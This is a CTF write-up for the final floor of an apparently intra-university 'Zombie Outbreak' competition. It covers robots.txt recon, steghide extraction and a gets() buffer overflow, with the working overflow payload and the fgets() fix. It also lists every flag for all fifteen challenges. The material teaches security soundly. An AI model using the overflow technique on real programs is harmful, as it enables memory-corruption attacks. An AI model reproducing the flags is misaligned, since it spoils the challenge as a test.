# Floor 5 — Main Lobby / Exit
## PUC Intra CTF: Zombie Outbreak | MISC / SYSTEMS — Final Escape | 750 pts

---

> *You've made it. The lobby. The main exit is right there — sealed doors, emergency lighting, the distant sound of something moving outside. One more system stands between you and freedom: the building's master security terminal.*

---

## Challenge Overview

| # | Name | Type | Points |
|---|---|---|---|
| 1 | Maintenance Notes | Antidote | 100 |
| 2 | Hidden Exit Code | Stairs | 250 |
| 3 | Manual Override Buffer | Lift | 400 |

**Target:** `http://<target>:5005` + `door_release` binary (file attachment)

---

## Antidote — Maintenance Notes (100 pts)

### What's going on?

The lobby WiFi kiosk is still running. You hit the landing page — it's a basic IT status board. Lists services, says the building lockdown is active. No links to anything useful. Dead end on the surface.

But web recon never starts at the homepage.

### The approach

`robots.txt` — always the first stop. This file exists to tell search engine bots which directories to skip, which makes it a free map of things the admin didn't want publicly indexed.

```bash
curl -s http://<target>:5005/robots.txt
```

```
User-agent: *
Disallow: /maintenance_locker_5F/
```

One disallowed path. Navigate there:

```bash
curl -s http://<target>:5005/maintenance_locker_5F/
```

You land on a maintenance locker page rendering `locker_notes.txt`:

```
PUCTF{r0b0ts_m41nt3n4nc3_l0ck3r_f0und}

Note for the night team:
The final exit door image (exit_door.jpg) has been
uploaded to /files/exit_door.jpg for the drill record.
Steganography password is "antidote" — same as always.
Don't forget to extract before the morning shift.
```

Two pieces of information buried in the note:
- The image location: `/files/exit_door.jpg`
- The steghide password: **"antidote"**

Both are required for the Stairs challenge.

### Flag
```
PUCTF{r0b0ts_m41nt3n4nc3_l0ck3r_f0und}
```

---

## Stairs — Hidden Exit Code (250 pts)

### What's going on?

The maintenance note pointed you to an image: `exit_door.jpg`. It's a JPEG of an emergency exit door — red lighting, push-bar, EXIT sign. Looks unremarkable. But the note specifically said "steganography" and gave you a password. Something is hidden inside.

### What is steganography?

Steganography is the art of hiding data inside other data. Unlike encryption (which makes data unreadable), steganography hides the fact that secret data even exists. `steghide` does this by subtly altering pixel values in JPEG images in ways that are invisible to the human eye but recoverable with the right password.

### Extracting the hidden file

```bash
# Download the image
curl -s -o exit_door.jpg http://<target>:5005/files/exit_door.jpg

# Extract hidden data using the password from the antidote
steghide extract -sf exit_door.jpg -p antidote
```

```
wrote extracted data to "exit_code.txt"
```

```bash
cat exit_code.txt
```

```
PUCTF{st3g0_3x1t_d00r_unl0ck3d_FR33D0M}
```

### Why the antidote mattered here

Without the password, steghide brute-force is computationally expensive and not feasible in a CTF time window. The antidote note was the bridge — it gave you both the image path and the password. Miss the antidote, and the Stairs flag becomes significantly harder to reach.

### Flag
```
PUCTF{st3g0_3x1t_d00r_unl0ck3d_FR33D0M}
```

---

## Lift — Manual Override Buffer (400 pts)

### What's going on?

A standalone binary `door_release` — the lobby's emergency door release terminal. Run it:

```bash
./door_release
=== LOBBY EMERGENCY RELEASE TERMINAL ===
Enter override code: hello
Door still locked.
```

It prompts for an override code, checks it somehow, and rejects everything you try. The override code isn't in any of the files found so far. You need to break the program itself.

### Step 1 — Understand the vulnerability

Open the binary in **Ghidra** or check the disassembly:

```bash
objdump -d door_release | grep -A 5 "gets"
```

You'll find the program uses `gets()` to read your input. This is the most dangerous function in the C standard library — deprecated and eventually removed from C11 entirely. The reason: `gets()` reads input until it hits a newline, **with no limit on how many bytes it reads**. It has no way to know how large the buffer is.

The decompiled `main()` in Ghidra reveals the structure:

```c
struct mem {
    char  buffer[64];   // your input goes here
    int   door_locked;  // immediately follows in memory
};

struct mem s;
s.door_locked = 1;
gets(s.buffer);             // dangerous: no bounds checking

if (s.door_locked == 0) {
    win();                  // prints the flag
}
```

The key insight: `buffer[64]` and `door_locked` are **adjacent in memory** inside the same struct. `door_locked` starts exactly at `buffer + 64` with no padding (because 64 is already 4-byte aligned).

### Step 2 — What needs to happen

`door_locked` starts as `1`. The program calls `win()` only when `door_locked == 0`.

If you write 64 bytes — filling the buffer completely — and then write 4 more bytes that are `\x00\x00\x00\x00`, those 4 null bytes overwrite `door_locked`, changing its value from `1` to `0`. The check passes. `win()` runs.

### Step 3 — Craft the payload

```python
import sys
# 64 bytes fills the buffer exactly
# 4 null bytes overwrites door_locked to 0
payload = b'A' * 64 + b'\x00' * 4 + b'\n'
sys.stdout.buffer.write(payload)
```

Pipe it to the binary:

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\x00'*4 + b'\n')" | ./door_release
```

```
=== LOBBY EMERGENCY RELEASE TERMINAL ===
Enter override code:
*** EXIT UNLOCKED! ***
PUCTF{buff3r_0v3rfl0w_FR33D0M_g4t3}
```

### Why null bytes work here

A critical question: doesn't `gets()` stop reading when it hits a null byte?

**No.** `gets()` stops only at a newline (`\n`) or EOF. Null bytes (`\x00`) are passed through without interruption — they're just regular byte values to `gets()`. This is different from string functions like `scanf("%s")` which stop at whitespace or null. Here the null bytes travel all the way through and land exactly where they need to.

### What this teaches

This is the foundational concept of **buffer overflow**: when a program writes input beyond the boundary of a fixed-size buffer, it corrupts whatever sits adjacent in memory. Here the adjacent data was a control variable (`door_locked`). In more complex scenarios, the adjacent data could be a return address — changing program flow entirely.

The fix is one line. Replace:
```c
gets(s.buffer);
```
With:
```c
fgets(s.buffer, sizeof(s.buffer), stdin);
```

`fgets()` takes a size argument. It stops reading when the buffer is full. The vulnerability disappears.

### Flag
```
PUCTF{buff3r_0v3rfl0w_FR33D0M_g4t3}
```

---

## Scoreboard

```
[✓] PUCTF{r0b0ts_m41nt3n4nc3_l0ck3r_f0und}    100 pts
[✓] PUCTF{st3g0_3x1t_d00r_unl0ck3d_FR33D0M}   250 pts
[✓] PUCTF{buff3r_0v3rfl0w_FR33D0M_g4t3}        400 pts
                                         TOTAL: 750 pts
```

---

## Final Escape — All 15 Flags Captured

```
Floor 9  [✓] PUCTF{f9_r3s1du4l_s3ss10n_n0t3}               100
Floor 9  [✓] PUCTF{sql1_st41rw3ll_4cc3ss_gr4nt3d}           250
Floor 9  [✓] PUCTF{jwt_4dm1n_3l3v4t0r_unl0ck3d}             400
Floor 8  [✓] PUCTF{b4se64_memo_r3v34l3d}                    100
Floor 8  [✓] PUCTF{c43s4r_r3s34rch_l0g_d3crypt3d}           250
Floor 8  [✓] PUCTF{rs4_3_cub3_r00t_m4st3r_f0rmul4}          400
Floor 7  [✓] PUCTF{3x1f_p4th0l0gy_d4t4_f0und}               100
Floor 7  [✓] PUCTF{b1nw4lk_z1p_3xtr4ct3d_st41rw3ll}         250
Floor 7  [✓] PUCTF{pc4p_ftp_3l3v4t0r_0v3rr1d3_f0und}        400
Floor 6  [✓] PUCTF{p4t13nt_z3r0_l0c4t10n_f0und}             100
Floor 6  [✓] PUCTF{g30l0c4t10n_0ld_l1br4ry_st41rs}          250
Floor 6  [✓] PUCTF{r3v3rs3d_synth3s1z3r_3l3v4t0r_unl0ck}   400
Floor 5  [✓] PUCTF{r0b0ts_m41nt3n4nc3_l0ck3r_f0und}         100
Floor 5  [✓] PUCTF{st3g0_3x1t_d00r_unl0ck3d_FR33D0M}        250
Floor 5  [✓] PUCTF{buff3r_0v3rfl0w_FR33D0M_g4t3}            400
                                               TOTAL: 3,750 pts
```

*The exit doors slide open. You survived the Zombie Outbreak.*
*Building escaped.*
